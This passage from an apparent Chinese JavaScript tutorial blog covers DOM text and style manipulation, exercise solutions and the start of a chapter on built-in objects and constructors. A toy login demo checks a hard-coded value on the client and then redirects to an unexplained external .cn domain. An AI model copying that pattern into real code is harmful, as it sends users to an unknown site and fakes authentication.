style=&quot;width:200px;display: block;&quot;&gt; &lt;form action=&quot;&quot;&gt; &lt;input type=&quot;text&quot; value=&quot;表单文本框内容&quot; name=&quot;txt&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;script&gt; //获取文本 //.innerHTML console.log(document.getElementById(&quot;btn&quot;).innerHTML); console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].innerHTML);//单标签不能这种方式获取文本内容，因为单标签没有文本内容。 //.innerText console.log(document.getElementById(&quot;btn&quot;).innerText);//过滤了标签，只保留文本内容 //.value console.log(document.getElementsByTagName(&quot;input&quot;)[0].value);//相当于获取属性 console.log(document.forms[0].txt.value); console.log(document.querySelector(&#x27;input&#x27;).value); // 用途：当用户注册时某个框失去焦点，开始验证信息是否满足要求 document.forms[0].txt.onblur = function()&#123;//onblur事件：失去焦点时触发该事件。 console.log(this.getAttribute(&#x27;value&#x27;));// this代表当前操作对象document.forms[0].txt if(this.value == &#x27;aaa&#x27;)&#123; alert(&quot;登录成功&quot;); location.href = &#x27;http://miketaylorjuly123.cn&#x27;;//location.href可以用于动态跳转。 &#125;else&#123; alert(&quot;登录失败&quot;); &#125; &#125;; console.log(document.getElementsByTagName(&quot;input&quot;)[0].getAttribute(&#x27;type&#x27;));//只能获取标签属性值，不能获取标签文本内容&lt;/script&gt; 可用功能：当用户注册时某个框失去焦点，立即验证信息是否满足要求。 17.5.2 设置文本设置文本的使用方法和获取文本方法差不多，直接对属性进行赋值。 1234节点.innerHTM= &quot;文本内容&quot; // 会翻译html标签节点.innerText = &quot;文本内容&quot; // 不会翻译html标签节点.value = 值 节点.setAttribute(&quot;value&quot;,值) // 因为value是属性，所以也可以中这个方法设置内容 注意：如果节点原本有内容，赋入内容后就会把原来的覆盖了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn&quot;&gt;切换图片&lt;span&gt;请点击&lt;/span&gt;&lt;/button&gt; &lt;form action=&quot;&quot;&gt; &lt;input type=&quot;text&quot; value=&quot;表单文本框内容&quot; name=&quot;txt&quot;&gt; &lt;br/&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot;&gt;男 &lt;br/&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;0&quot;&gt;女 &lt;br/&gt; &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;敲代码&quot;&gt;敲代码 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;看美剧&quot;&gt;看美剧 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;GTA5&quot;&gt;GTA5 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;其他&quot;&gt;其他&lt;br/&gt; &lt;input type=&quot;button&quot; value=&quot;提交&quot; id=&quot;ok&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;script&gt; //设置文本 //.innerHTML,会自动解析标签 document.getElementById(&quot;btn&quot;).innerHTML = &#x27;aaa&#x27;; document.getElementById(&quot;btn&quot;).innerHTML = &#x27;&lt;strong&gt;命令按钮&lt;/strong&gt;&#x27;; //.innerText，不会翻译html内容 document.getElementById(&quot;btn&quot;).innerText = &#x27;&lt;strong&gt;命令按钮&lt;/strong&gt;&#x27;; //.value //设置某个单选按钮被选中 document.forms[0].sex.value = 0; document.forms[0].sex.value = 1; //设置某个复选框选项被选中,使用checked属性实现 // document.forms[0].hobby = &#x27;b&#x27;;//不能通过value设置复选框的某项被选中。 document.forms[0].hobby[1].checked = true; document.forms[0].hobby[2].checked = true; //单机提交按钮，获取所有复选框被选中的值。 document.querySelector(&#x27;#ok&#x27;).onclick = function()&#123; var chks = document.forms[0].hobby; //获取所有的复选框DOM console.dir(chks); var arr = []; for (var i in chks)&#123; if(chks[i].checked)&#123;//如果被选中 arr.push(chks[i].value); &#125; &#125; console.log(arr); &#125;; //.setAttribute(&quot;value&quot;,值) document.forms[0].hobby[3].setAttribute(&quot;checked&quot;,true);//后面带任何值都是被选中包括false。 // document.forms[0].hobby[3].setAttribute(&quot;checked&quot;,false);//不起作用，要使用下面的方法 //方法一： // document.forms[0].hobby[3].removeAttribute(&quot;checked&quot;); //方法二： // document.forms[0].hobby[3].checked = &#x27;&#x27;; //方法三： document.forms[0].hobby[3].checked = false;&lt;/script&gt;&lt;/html&gt; 可用功能： 设置某个单选框/复选框的值被选中。 使用提交按钮，提交选择框的信息。 设置某个单选框/复选框的值未被选中。 17.5.3 删除文本删除文本内容可通过设置属性为空或者移除value属性来实现。 1234节点.innerHTM= &quot;&quot; 节点.innerText = &quot;&quot; 节点.value = &quot;&quot; 节点.removeAttribute(&quot;value&quot;) //它是直接删除属性。 17.6 DOM节点样式操作17.6.1 操作样式class 可以通过操作节点class属性来获取或者设置节点的样式。 获取12节点.className 获取节点的所有class节点.getAttribute(&quot;class&quot;) 获取节点的所有class 设置 [注意设置会将原来的值覆盖]12节点.className = 值节点.setAttribute(&quot;class&quot;,值) HTML5为元素提供了一个新的属性：classList 来实现对元素样式表的增删改查。1234节点.classList.add(value); //为元素添加指定的类 节点.classList.contains(value); // 判断元素是否含有指定的类，如果存在返回true 节点.classList.remove(value); // 删除指定的类 节点.classList.toggle(value); // 有就删除，没有就添加指定类 17.6.1.2 实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;操作class&lt;/title&gt; &lt;style&gt; .p-style&#123; color:#8080ff; font-size: 30px; font-weight: bold; &#125; .demo&#123; background-color: cyan; color: #e71590; height: 200px; line-height: 200px; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p class=&quot;test p-style&quot;&gt;这是一段测试文本&lt;/p&gt; &lt;p class=&quot;test&quot;&gt;这是一段测试文本&lt;/p&gt;&lt;/body&gt;&lt;script&gt; //获取节点所有class //.className let cont = document.getElementsByClassName(&#x27;test&#x27;); console.log(cont); console.log(cont[0].className); //.getAttritube(&quot;class&quot;) console.log(cont[0].getAttribute(&#x27;class&#x27;)); // 设置节点class属性 cont[1].className = &#x27;p-style&#x27;; console.log(cont);//可以看到，数组cont变少了一个元素，说明赋值后，不含test class属性的被从数组中删除了。 // cont[1].className = &#x27;test&#x27;; //报错，原因如上述。 document.getElementsByClassName(&#x27;p-style&#x27;)[1].setAttribute(&#x27;class&#x27;,&#x27;test&#x27;); //还原 console.log(cont); //.classList //add：添加类 cont[1].classList.add(&#x27;demo&#x27;); //contains：检测类 console.log(cont[1].classList.contains(&#x27;demo&#x27;)); //remove：删除类 cont[1].classList.remove(&#x27;demo&#x27;); //toggle：有则删除，无则添加 cont[1].onclick = function()&#123; cont[1].classList.toggle(&#x27;demo&#x27;); &#125;;&lt;/script&gt;&lt;/html&gt; 可用功能：点击某个区域后，触发css样式的改变！ 17.6.2 操作具体样式17.6.2.1 获取内联样式style属性 定义：节点的style属性，包含所有的css属性。 通过访问这个对象下面具体的属性获取这个节点的某个内联样式内容； 通过style属性下面的cssText属性，可以获取到这个节点的所有内联样式内容，不过返回的是字符串。 12节点.style.样式属性名 // 获取某个具体的内联样式节点.style.cssText // 获取某个节点的所有内联样式，返回字符串 注意：访问某个节点的某个具体的样式的时候，如果这个样式如font-size这样的需要使用驼峰命名法写成 fontSize这样。 getComputedStyle(略) getComputedStyle是window的方法。它能够获取当前元素所有最终使用的CSS属性值，只读。它有两个参数，第一个为传入的节点，第二个可以传入:hover,:blur等获取其伪类样式，如果没有则传入null。 注意：IE并不支持getComputedStyle方法，可以使currentStyle来保持兼容性 123456789101112&lt;div id=&quot;box&quot; style=&quot;width:300px;height:100px;background-color:red;&quot;&gt;&lt;/div&gt; window.onload=function()&#123; var oBox = document.getElementById(&quot;box&quot;); alert(getElementStyle(oBox,&quot;backgroundColor&quot;)); &#125; function getElementStyle(obj,attr)&#123; if(obj.currentStyle)&#123; return obj.currentStyle[attr]; &#125;else&#123; return getComputedStyle(obj,null)[attr]; &#125; &#125; 17.6.2.2 设置内联样式通过设置节点的style属性下面的属性可以设置节点的某个内联样式。 通过style属性下面的cssText属性，可以设置这个节点的所有内联样式。 123456789101112131415&lt;button id=&quot;btn1&quot;&gt;设置背景颜色&lt;/button&gt; &lt;button id=&quot;btn2&quot;&gt;设置字体颜色、字体大小、背景颜色&lt;/button&gt; &lt;div id=&quot;box&quot;&gt;前端开发&lt;/div&gt; &lt;script&gt; var box = document.getElementById(&quot;box&quot;); var btn1 = document.getElementById(&quot;btn1&quot;); var btn2 = document.getElementById(&quot;btn2&quot;); //添加单个内联样式 btn1.onclick = function()&#123; box.style.backgroundColor = &quot;red&quot;; &#125; //添加多个内联样式 btn2.onclick = function()&#123; box.style.cssText = &quot;font-size:32px;color:white;background-color:green;&quot;; &#125; &lt;/script&gt; 17.8 课后实训1、实现表格隔行变色效果，需求如下： &gt;隔行变色 &gt; 鼠标进入高亮显示，移开恢复原来的颜色 事件： onload：页面加载自动启动 onclick ：单击 onmouseover：双击 onmouseover ：鼠标移入 onmousemove ：鼠标移动 onmouseout：鼠标移出 onkeydown ：按下任意键 onkeyup ：松开任意键 onkeypress ：输入 onblur ：失去焦点 onfoucs ：获得焦点 onresize：改变窗口大小 可以通过console.log(document)找开头为on的查找。 onsubmit：提交事件 onreset：重置事件 onchange：内容改变 onmousedown：按下鼠标 onmouseout：松开鼠标 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; th &#123; background-color: #169be7; color: #fff; width:100px; &#125; tr&#123; text-align:center; cursor: pointer; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;课程&lt;/th&gt; &lt;th&gt;成绩&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;徐&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;徐&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;楚&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;65&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;4&lt;/td&gt; &lt;td&gt;楚&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;80&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;张&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;6&lt;/td&gt; &lt;td&gt;张&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;script&gt; let table = document.getElementsByTagName(&#x27;table&#x27;)[0]; console.log(table); let tr = table.getElementsByTagName(&#x27;tr&#x27;); console.log(tr); // 实现跳变色序列 for(var i = 0;i&lt;tr.length;i++)&#123; if(i%2 === 1)&#123; console.log(tr[i]); tr[i].style.backgroundColor = &#x27;#777&#x27;; tr[i].onmouseout = function()&#123; this.style.backgroundColor = &#x27;#777&#x27;; &#125; &#125;else&#123; tr[i].style.backgroundColor = &#x27;#aaa&#x27;; tr[i].onmouseout = function()&#123; this.style.backgroundColor = &#x27;#aaa&#x27;; &#125;; &#125; tr[i].onmouseover = function()&#123; this.style.backgroundColor = &#x27;yellow&#x27;; &#125;; &#125; // &lt;/script&gt;&lt;/html&gt; 讲义答案： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;表格操作&lt;/title&gt;&lt;/head&gt;&lt;style&gt; *&#123; margin: 0; padding: 0; &#125; table&#123; border-collapse: collapse; margin: 50px auto; &#125; tr&#123; text-align: center; &#125; th,td&#123; height: 35px; &#125; td&#123; cursor: pointer; &#125; th &#123; background-color: rgb(0,153,203); color: #fff; &#125; tbody tr:nth-child(even)&#123; /*偶数*/ background-color: #eee; &#125; tbody tr:nth-child(odd)&#123; /*奇数*/ background-color: #999; &#125;&lt;/style&gt;&lt;body&gt; &lt;table border=&#x27;1&#x27; width=&#x27;400&#x27;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;课程&lt;/th&gt; &lt;th&gt;成绩&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;徐&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;徐&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;楚&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;65&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;4&lt;/td&gt; &lt;td&gt;楚&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;80&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;张&lt;/td&gt; &lt;td&gt;数据结构&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;6&lt;/td&gt; &lt;td&gt;张&lt;/td&gt; &lt;td&gt;操作系统&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/body&gt;&lt;script&gt; let tr = document.getElementsByTagName(&#x27;tbody&#x27;)[0].getElementsByTagName(&#x27;tr&#x27;); for (var i in tr)&#123; tr[i].onmouseover = function()&#123; this.style.backgroundColor = &#x27;yellow&#x27;; &#125;; tr[i].onmouseout= function()&#123; this.style.backgroundColor =&#x27;&#x27;; //精髓！！！ &#125;; &#125;&lt;/script&gt;&lt;/html&gt; 2、实现相册功能。需求如下： 点击小图片，让下面的大图片修改路径为相应的大图片，让下面的图片说明修改innerHTML。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;轮播图&lt;/title&gt; &lt;style&gt; h2&#123; margin-left: 40px; &#125; .digitial&#123; width:800px; border: 2px #8080ff solid; &#125; ul&#123; overflow: hidden; &#125; ul li&#123; list-style: none; float:left; margin-right: 20px; &#125; .big&#123; width:100%; display: flex; &#125; #display&#123; flex: 1; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;digitial&quot;&gt; &lt;h2&gt;相册&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;img src=&quot;../imgs/Heavenly fragments_83355995.png&quot; alt=&quot;&quot; id=&quot;1&quot; style=&quot;width: 150px;&quot; class=&quot;small&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;../imgs/アークナイツ_81306280_p0.png&quot; alt=&quot;&quot; id=&quot;2&quot; style=&quot;width: 150px;&quot; class=&quot;small&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;../imgs/読書の秋_77843801.png&quot; alt=&quot;&quot; id=&quot;3&quot; style=&quot;width: 150px;&quot; class=&quot;small&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;../imgs/💚🖤💛_77153324.png&quot; alt=&quot;&quot; id=&quot;4&quot; style=&quot;width: 175px;&quot; class=&quot;small&quot;&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div class=&quot;big&quot;&gt; &lt;img src=&quot;../imgs/Heavenly fragments_83355995.png&quot; alt=&quot;&quot; id=&quot;display&quot; style=&quot;width: 600px;&quot;&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; let imgs = document.getElementsByClassName(&#x27;small&#x27;); let loading = document.getElementById(&#x27;display&#x27;); let show = document.getElementById(&#x27;1&#x27;); console.log(imgs); for (var i in imgs)&#123; imgs[i].onclick = function()&#123; show.style.opacity = &#x27;1&#x27;; this.style.opacity = &quot;0.5&quot;; show = this; loading.setAttribute(&#x27;src&#x27;,this.getAttribute(&#x27;src&#x27;)); &#125; &#125;&lt;/script&gt;&lt;/html&gt; 讲义答案： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;相册&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .wrapper&#123; width: 600px; margin: 50px auto 0; border: 1px solid #aaa; padding: 20px; &#125; h2&#123; margin-bottom: 20px; &#125; ul&#123; overflow: hidden; margin-bottom: 20px; &#125; ul li&#123; list-style-type: none; float: left; margin-right: 10px; &#125; ul li:last-child&#123; margin-right: 0; &#125; ul li img&#123; width: 142px; cursor: pointer; &#125; .wrapper&gt;img&#123; width: 100%; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;h2&gt;美女相册&lt;/h2&gt; &lt;hr&gt; &lt;ul&gt; &lt;li&gt;&lt;img class=&quot;photo-item&quot; src=&quot;images/05-1-small.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img class=&quot;photo-item&quot; src=&quot;images/05-2-small.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img class=&quot;photo-item&quot; src=&quot;images/05-3-small.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img class=&quot;photo-item&quot; src=&quot;images/05-4-small.jpg&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;img class=&quot;large-img&quot; src=&quot;images/05-placeholder.png&quot; /&gt; &lt;p&gt;请选择图片&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; var img = document.querySelector(&#x27;.large-img&#x27;); var items = document.querySelectorAll(&#x27;.photo-item&#x27;); var p = document.querySelector(&#x27;p&#x27;); for(var i=0;i&lt;items.length;i++)&#123; items[i].onmouseover = function () &#123; // onclick 或 onmouseenter var src = this.getAttribute(&#x27;src&#x27;).replace(&#x27;-small&#x27;,&#x27;&#x27;); img.setAttribute(&#x27;src&#x27;,src); var idx = src.substr(10,1); var str = &#x27;&#x27;; switch (idx)&#123; case &#x27;1&#x27;: str = &#x27;美女A&#x27;;break; case &#x27;2&#x27;: str = &#x27;美女B&#x27;;break; case &#x27;3&#x27;: str = &#x27;美女C&#x27;;break; case &#x27;4&#x27;: str = &#x27;美女D&#x27;; &#125; p.innerText = str;//s &#125; &#125;&lt;/script&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"}]},{"title":"JavaScript高级-面向对象","slug":"前端学习18","date":"2021-05-31T04:29:45.000Z","updated":"2021-05-31T14:49:47.345Z","comments":true,"path":"2021/05/31/前端学习18/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/31/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A018/","excerpt":"","text":"第16章 JavaScript高级-面向对象课程提要 内置对象 面向对象入门 基本包装类型 变量、作用域及内存 16.1 内置对象16.1.1 Global对象Global(全局)对象是ECMAScript中一个特别的对象，因为这个对象是不存在的。在ECMAScript中不属于任何 其他对象的属性和方法，都属于它的属性和方法。所以，事实上，并不存在全局变量和全局函数；所有在全局作用域定义的变量和函数，都是Global对象的属性和方法。 PS：因为ECMAScript没有定义怎么调用Global对象，所以，Global.属性或者Global.方法()都是无效的。(Web 浏览器将Global作为window对象的一部分加以实现)。 16.1.1.1 URI编码方法 URI编码可以对链接进行编码，以便发送给浏览器。它们采用特殊的UTF-8编码替换所有无效字符，从而让浏览器能够接受和理解。 encodeURI()不会对本身属于URI的特殊字符进行编码，例如冒号、正斜杠、问号和#号；而 encodeURIComponent()则会对它发现的任何非标准字符进行编码。 1234var box = &#x27;//Lee李&#x27;;alert(encodeURI(box)); //只编码了中文var box = &#x27;//Lee李&#x27;;alert(encodeURIComponent(box)); //特殊字符和中文编码了 PS：因为encodeURIComponent()编码比encodeURI()编码来的更加彻底，一般来说encodeURIComponent() 使用频率要高一些。 使用了URI编码过后，还可以进行解码，通过decodeURI()和decodeURIComponent()来进行解码。 1234var box = &#x27;//Lee李&#x27;;alert(decodeURI(encodeURI(box))); //还原var box = &#x27;//Lee李&#x27;;alert(decodeURIComponent(encodeURIComponent(box))); //还原 PS：URI方法如上所述的四种，用于代替已经被ECMA-262第3版废弃的escape()和unescape()方法。URI方法 能够编码所有的Unicode字符，而原来的只能正确地编码ASCII字符。所以建议不要再使用escape()和unescape()方法。 16.1.1.2 eval()方法eval()方法主要担当一个字符串解析器的作用，他只接受一个参数，而这个参数就是要执行的JavaScript代码的字符串。 12345eval(&#x27;var box = 100&#x27;);//解析了字符串代码 alert(box); eval(&#x27;alert(100)&#x27;);//同上 eval(&#x27;function box() &#123;return 123&#125;&#x27;); //函数也可以 alert(box()); eval()方法的功能非常强大，但也非常危险。因此使用的时候必须极为谨慎。特别是在用户输入数据的情况 下，非常有可能导致程序的安全性，比如代码注入等等。 16.1.1.3 Global对象属性Global对象包含了一些属性：undefined、NaN、Object、Array、Function等等。 1alert(Array); //返回构造函数 16.1.1.4 window对象之前已经说明，Global没有办法直接访问，而Web浏览器可以使用window对象来实现一全局访问。 1alert(window.Array); //同上 16.1.2 Math对象ECMAScript还为保存数学公式和信息提供了一个对象，即Math对象。与我们在JavaScript直接编写计算功能 相比，Math对象提供的计算功能执行起来要快得多。 16.1.2.1 Math对象的属性Math对象包含的属性大都是数学计算中可能会用到的一些特殊值。 属性 说明 Math.E 自然对数的底数，即常量e Math.LN10 10的自然对数 Math.LN2 2的自然对数 Math.LOG2E 以2为底数e的对数 Math.LOG10E 以10为底数e的对数 Math.PI π的值 Math.SQRT1_2 1/2的平方根 Math.SQRT2 2的平方根 12345678910&lt;script&gt; console.log(Math.E); //2.718281828459045 console.log(Math.LN10); //2.302585092994046 console.log(Math.LN2); //0.6931471805599453 console.log(Math.LOG2E); //1.4426950408889634 console.log(Math.LOG10E); //0.4342944819032518 console.log(Math.PI); //3.141592653589793 console.log(Math.SQRT1_2); //0.7071067811865476 console.log(Math.SQRT2); //1.4142135623730951&lt;/script&gt; 16.1.2.2 min()和max()方法 Math.min()用于确定一组数值中的最小值。Math.max()用于确定一组数值中的最大值。 12alert(Math.min(2,4,3,6,3,8,0,1,3)); //最小值 alert(Math.max(4,7,8,3,1,9,6,0,3,2)); //最大值 16.1.2.3 舍入方法123456789101112Math.ceil()执行向上舍入，即它总是将数值向上舍入为最接近的整数；Math.floor()执行向下舍入，即它总是将数值向下舍入为最接近的整数；Math.round()执行标准舍入，即它总是将数值四舍五入为最接近的整数；alert(Math.ceil(25.9)); //26 alert(Math.ceil(25.5)); //26 alert(Math.ceil(25.1)); //26 alert(Math.floor(25.9));//25 alert(Math.floor(25.5));//25alert(Math.floor(25.1));//25 alert(Math.round(25.9));//26 alert(Math.round(25.5));//26 alert(Math.round(25.1));//25 16.1.2.4 random()方法Math.random()方法返回介于0到1之间一个随机数，不包括0和1。如果想大于这个范围的话，可以套用一下 1公式： 值 = Math.floor(Math.random() * 总数 + 第一个值) 12345alert(Math.floor(Math.random() * 10 + 1)); //随机产生1-10之间的任意数 for (var i = 0; i&lt;10;i ++) &#123; document.write(Math.floor(Math.random() * 10 + 5)); //5-14之间的任意数 document.write(&#x27;&lt;br /&gt;&#x27;);&#125; 为了更加方便的传递想要范围，可以写成函数： 12345678910&lt;script&gt; function selectFrom(lower, upper) &#123; var sum = upper - lower + 1; //总数-第一个数+1 return Math.floor(Math.random() * sum + lower); &#125; for (var i=0 ;i&lt;10;i++) &#123; document.write(selectFrom(5,10)); //直接传递范围即可 document.write(&#x27;&lt;br /&gt;&#x27;); &#125; &lt;/script&gt; 16.1.2.5 其他方法 方法 说明 Math.abs(num) 返回num的绝对值 Math.exp(num) 返回Math.E的num次幂 Math.log(num) 返回num的自然对数 Math.pow(num,power) 返回num的power次幂 Math.sqrt(num) 返回num的平方根 Math.acos(num) 返回num的反余弦值 Math.asin(num) 返回num的反正弦值 Math.atan(num) 返回num的反正切值 Math.atan2(y,x) 返回y/x的反正切值 Math.cos(num) 返回num的余弦值 Math.sin(num) 返回num的正弦值 Math.tan(num) 返回num的正切值 注意：使用三角函数前要把角度换算成弧度制： *弧度制 = 角度 / 180 * Math.PI* 16.2 面向对象入门创建对象的方法 16.2.1 创建一个对象创建一个对象，然后给这个对象新建属性和方法。 1234567var box = new Object(); //创建一个Object对象 box.name = &#x27;Lee&#x27;; //创建一个name属性并赋值 box.age = 100; //创建一个age属性并赋值 box.run = function () &#123; //创建一个run()方法并返回值 return this.name + this.age + &#x27;运行中...&#x27;; &#125;; alert(box.run()); //输出属性和方法的值 16.2.2 工厂模式上面创建了一个对象，并且创建属性和方法，在run()方法里的this，就是代表box对象本身。这种是JavaScript 创建对象最基本的方法，但有个缺点，想创建一个类似的对象，就会产生大量的代码。 12345678910var box2 = box; //得到box的引用 box2.name = &#x27;Jack&#x27;; //直接改变了name属性 alert(box2.run()); //用box.run()发现name也改变了 var box2 = new Object(); box2.name = &#x27;Jack&#x27;; box2.age = 200; box2.run = function () &#123; return this.name + this.age + &#x27;运行中...&#x27;; &#125;; alert(box2.run()); //这样才避免和box混淆，从而保持独立 为了解决多个类似对象声明的问题，我们可以使用一种叫做工厂模式的方法，这种方法就是为了解决实例化对 象产生大量重复的问题。 12345678910111213function createObject(name, age) &#123; //集中实例化的函数 var obj = new Object(); obj.name = name; obj.age = age; obj.run = function () &#123; return this.name + this.age + &#x27;运行中...&#x27;; &#125;; return obj; &#125; var box1 = createObject(&#x27;Lee&#x27;, 100); //第一个实例 var box2 = createObject(&#x27;Jack&#x27;, 200); //第二个实例 alert(box1.run()); alert(box2.run()); //保持独立 16.2.3 构造方法工厂模式解决了重复实例化的问题，但还有一个问题，那就是识别问题，因为根本无法搞清楚他们到底是哪个 对象的实例。 12alert(typeof box1); //Object alert(box1 instanceof Object); //true ECMAScript中可以采用构造函数（构造方法）可用来创建特定的对象。类似于Object对象。 1234567891011function Box(name, age) &#123; //构造函数模式 this.name = name; this.age = age; this.run = function () &#123; return this.name + this.age + &#x27;运行中...&#x27;; &#125;; &#125;var box1 = new Box(&#x27;Lee&#x27;, 100); //new Box()即可 var box2 = new Box(&#x27;Jack&#x27;, 200); alert(box1.run()); alert(box1 instanceof Box); //很清晰的识别他从属于Box 使用构造函数的方法，即解决了重复实例化的问题，又解决了对象识别的问题，但问题是，这里并没有new Object()，为什么可以实例化Box()，这个是哪里来的呢？ 使用了构造函数的方法，和使用工厂模式的方法他们不同之处如下： 构造函数方法没有显式的创建对象(new Object())； 构造函数方法没有显式的创建对象(new Object())； 没有renturn语句。 构造函数的方法有一些规范： 函数名和实例化构造名相同且大写，(PS：非强制，但这么写有助于区分构造函数和普通函数)； 通过构造函数创建对象，必须使用new运算符。 既然通过构造函数可以创建对象，那么这个对象是哪里来的，new Object()在什么地方执行了？执行的过程如 下： 当使用了构造函数，并且new 构造函数()，那么就后台执行了new Object()； 